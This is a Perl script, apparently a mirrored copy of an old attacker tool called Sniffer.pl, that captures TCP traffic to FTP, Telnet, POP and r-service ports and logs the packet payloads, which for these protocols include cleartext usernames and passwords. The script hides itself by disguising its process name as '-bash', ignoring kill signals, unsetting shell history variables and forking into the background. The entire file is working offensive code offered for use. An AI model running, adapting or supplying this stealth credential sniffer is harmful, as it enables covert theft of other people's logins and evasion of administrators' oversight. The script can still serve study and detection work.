#!/usr/bin/perl
#
# Original File
# -------------
#	http://www.atrix-team.org/files/sniffer.pl
#
#
# 08-Dec-04 amo Mirrored at http://Linux-Sec.net/Sniffer/Scripts
#
#
# Sniffer.pl 0.6
#
#  0ldW0lf - old-wolf@zipmail.com
#          - www.atrixbr.cjb.net
#          - www.atrix.cjb.net
#
#        
# based on rawsnif.pl
#

use Net::RawIP;
use Socket;

# logs will be created by port, eg: snf-log.21

# config
$processo='-bash'; #process name
my $pdev=""; #interface to sniff - none especifyed it will be looked up
my $log = 'snf-log'; #log dir
##
mkdir("$log");

$log =~ s/\/$//;
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';

delete $ENV{'HISTFILE'};
delete $ENV{'HISTFILESIZE'};
delete $ENV{'HISTSIZE'};


$0=$processo."\0"x16;
my $pid=fork;
exit if $pid;
my $pfil = "tcp and (  dst port 21 or dst port 23 or dst port 110 or dst port 109 or dst port 513 or dst port 543 or dst port 514 )"; #por ai vai
my $psize = 1024;
my $ptout = 64;
my $ip = 20;
my (@p, %pd);
$pdev=Net::RawIP::lookupdev($ptout) unless $pdev;
my $p=new Net::RawIP({ip=>{},tcp=>{}});
my $psck=$p->pcapinit($pdev,$pfil,$psize,$ptout);
my $offset=Net::RawIP::linkoffset($psck);
print "\nSniffing interface: $pdev\n";
die "Erro: Link Offset naum permitido!\n" if (!$offset);
while ( 1 ) {

loop $psck,10,\&parse,@p;

}
sub parse {
  my $pckt=$_[2];

  my $flags=unpack("B8",substr($pckt,$offset+$ip+13,1));
#  my $conck=substr($flags,6,1);
#  my $disconck=substr($flags,7,1);

  my @saddr=unpack("CCCC",substr($pckt,$offset+12,4));

  my $saddr=join('.',@saddr);
  my @daddr=unpack("CCCC",substr($pckt,$offset+16,4));
  $daddr=join('.',@daddr);
  $sport=unpack("nn",substr($pckt,$offset+$ip,4));
  $dport=unpack("nn",substr($pckt,$offset+$ip+2,4));

  my $tdata=(substr($pckt,$offset+$ip+(unpack("C",(substr($pckt,$offset+$ip+12,1)))/4)));
  my $logfile = "$log/snf-log.$dport";
  open(LOG, ">> $logfile");
  print LOG "$saddr:$sport (".resolve($saddr).") -> $daddr:$dport (".resolve($daddr).") -- $tdata\n" if $tdata;
  close LOG;

}


sub resolve {
   my $dns = shift;
   my($match, $x, $y);
   $dns =~ s/^\s+|\s+$//g;

   if ($dns =~ /(\d+\.\d+\.\d+\.\d+)/) {
      $match = $1;

      $y = pack('C4', split(/\./, $match));
      $x = (gethostbyaddr($y, &AF_INET));

      if ($x !~ /^\s*$/) {
         return("$x") unless ($x =~ /^\s*$/);
      }

   } else {
       $x = join('.',unpack('C4',(gethostbyname($dns))[4]));
       return("$x") if ($x !~ /^\s*$/);
   }

   return("reverse not found");
}
#
# End of file
